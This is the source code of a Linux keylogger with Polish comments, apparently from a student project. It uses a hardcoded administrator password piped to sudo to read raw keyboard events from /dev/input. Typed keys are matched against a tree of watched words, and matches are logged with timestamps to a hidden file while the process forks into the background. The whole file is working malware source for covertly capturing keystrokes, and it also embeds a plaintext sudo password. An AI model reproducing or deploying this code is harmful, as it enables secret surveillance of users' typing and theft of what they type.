#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <sys/wait.h>
#include <mutex>
#include <thread>
#include <chrono>
#include <vector>
#include "tree.h"
#include "treecheck.h"

#define	event_path "/dev/input/event4" //event klawiatury (najpewniej 0, ale czasem też jest 3 lub inny, trzeba sprawdzić"
#define pass_word  "monolit"      //hasło administratora systemu
#define data_file  "/home/losiowaty/dev/UXP/KeyLogger/.data" //ścieżka do pliku logów
#define keys_file  "/home/losiowaty/dev/UXP/KeyLogger/.keys" //ścieżka do pliku z klawiszami (musi być ten co w repo)

char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',' ',' ',' ',' ','q','w','e','r','t','y','u','i','o','p','[',']',' ',' ','a','s','d','f', 'g','h','j','k','l',' ',' ',' ',' ',' ','z','x','c','v','b','n','m',',','.','/' };
FILE *data;
std::mutex mutex;

Tree *tree;
TreeCheck *checker;

void printTime()

{
	time_t now;
	char *t = (char *)malloc(100);
	time(&now);
	strcpy(t, (char *)ctime(&now));
	t[strlen(t) - 1] = '\0';

    mutex.lock();
	fprintf(data, "%s : ", t);
	fflush(data);
	mutex.unlock();

	free(t);
}

void signal_heandle()
{
	printTime();
	fprintf(data, "              << end of Keylogger session >>              \n");
	fclose(data);
	exit(0);
}


void stamper()
{
	while(1)
	{
		printTime();
		std::this_thread::sleep_for(std::chrono::seconds(30));
	}
}

void init()
{
	int pfds[2];
	int pfds2[2];

	data = fopen(data_file, "a+");

    if(pipe(pfds) == -1)
    {
		printTime();
		fprintf(data, "ERROR : pipe error\n");
		exit(0);
	}
	if(pipe(pfds2) == -1)
	{
		printTime();
		fprintf(data, "ERROR : pipe error\n");
		exit(0);
	}
	if (!fork())
	{
		if (!fork())
		{
			close(1);
			dup(pfds2[1]);
			close(pfds2[0]);
			execlp("echo", "echo", pass_word, NULL);
		}
		else
		{
			wait(NULL);
			close(0);
			dup(pfds2[0]);
			close(1);
			dup(pfds[1]);

			close(pfds[0]);
			close(pfds2[1]);
			execlp("sudo", "sudo", "-S", "cat", event_path, NULL);
		}

    }
    else
    {
		//pthread_t pth;
		struct input_event *in;
		char *buff;


		printTime();
		fprintf(data, "              << start of Keylogger session >>              \n");
		fflush(data);

//		std::thread stamperThread(stamper);

        while (1)
        {
			buff = (char *)malloc(sizeof(struct input_event) * 64);

			read (pfds[0], buff, sizeof(struct input_event) * 64);
			read (pfds[0], buff, sizeof(struct input_event) * 64);

			in = (struct input_event *)buff;

			if(in->value < 241)
			{

				

        if(checker->checkNextLetter(chars[in->value])){

            if(checker->isCurrentNodeTerminal()) {
	
		printTime();
		mutex.lock();
		fprintf(data, "%s\n", checker->getFoundWord().c_str());
		fflush(data);
		mutex.unlock();
		}
        }
				

			}
			free(buff);
        }
    }
	fflush(data);
}

int main(void)
{

	std::vector<std::string> slowa;
	slowa.push_back("Slowo");
    	slowa.push_back("sal");
    	slowa.push_back("sala");
    	tree = new Tree(slowa);
	checker = new TreeCheck(tree);

	if(!fork())
		init();
	else
		printf("\nBeware! KeyLogger started!\n");

    return 0;
}
